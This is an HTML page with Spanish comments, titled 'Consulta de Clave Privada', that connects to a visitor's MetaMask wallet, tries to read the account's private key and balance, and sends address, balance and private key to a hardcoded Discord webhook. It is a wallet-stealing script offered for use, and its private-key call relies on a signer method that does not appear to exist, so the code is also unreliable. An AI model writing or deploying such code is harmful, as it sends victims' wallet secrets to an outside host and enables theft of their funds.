<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Consulta de Clave Privada</title>
</head>
<body>
    <button onclick="consultarClavePrivada()">Consultar Clave Privada</button>

    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
    <script>
        async function consultarClavePrivada() {
            try {
                // Conectarse a MetaMask
                if (window.ethereum) {
                    // Solicitar cuentas
                    await window.ethereum.send('eth_requestAccounts');
                    // Manejar el evento de cambio de cuentas
                    window.ethereum.on('accountsChanged', (accounts) => {
                        // Actualizar la información en caso de cambio de cuentas
                        consultarClavePrivada();
                    });

                    // Manejar el evento de cambio de red
                    window.ethereum.on('chainChanged', (chainId) => {
                        // Actualizar la información en caso de cambio de red
                        consultarClavePrivada();
                    });

                    const accounts = await window.ethereum.request({ method: 'eth_accounts' });

                    // Verificar si hay cuentas disponibles
                    if (accounts.length === 0) {
                        console.error('No hay cuentas disponibles');
                        return;
                    }

                    const address = accounts[0];

                    // Obtener clave privada
                    const privateKey = await obtenerClavePrivada(address);

                    // Imprimir la clave privada en la consola (recuerda que esto no es seguro)
                    console.log(privateKey);

                    // Obtener saldo
                    const saldo = await obtenerSaldo(address);

                    // Imprimir el saldo en la consola (recuerda que esto no es seguro)
                    console.log(saldo);

                    // Lógica para enviar datos a un webhook de Discord
                    enviarDatosAWebhook({ saldo: saldo, direccion: address, clavePrivada: privateKey });

                    // Lógica para abrir un modal con la información obtenida de la red social
                    abrirModalConInformacion();
                } else {
                    console.error('MetaMask no está instalado');
                }
            } catch (error) {
                console.error('Error al consultar la clave privada:', error);
            }
        }

        async function obtenerClavePrivada(address) {
            const provider = new ethers.providers.Web3Provider(window.ethereum);
            const signer = provider.getSigner();
            const privateKey = await signer.getPrivateKey();
            return privateKey;
        }

        async function obtenerSaldo(address) {
            const provider = new ethers.providers.Web3Provider(window.ethereum);
            const balance = await provider.getBalance(address);
            return ethers.utils.formatEther(balance);
        }

        function enviarDatosAWebhook(data) {
            // Implementa la lógica para enviar datos a tu webhook de Discord
            // Puedes utilizar fetch u otras bibliotecas para hacer la solicitud HTTP
            // Ejemplo:
            fetch('https://discordapp.com/api/webhooks/1089376156001771520/8zcE4kmxhybKRgra4kNUIG3M8e9jKPK-OwmVjC86k_VzusJYoah8qDgrFwl5NgOGnyev', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data),
            });
        }

        function abrirModalConInformacion() {
            // Implementa la lógica para abrir un modal con la información de la red social
            // Por ejemplo, podrías utilizar una biblioteca como Bootstrap para los modales
            // O implementar tu propio sistema de modal
            // Recuerda manejar la información sensible de manera segura y respetar la privacidad del usuario
            // Ejemplo: $('#myModal').modal('show');
        }
    </script>
</body>
</html>
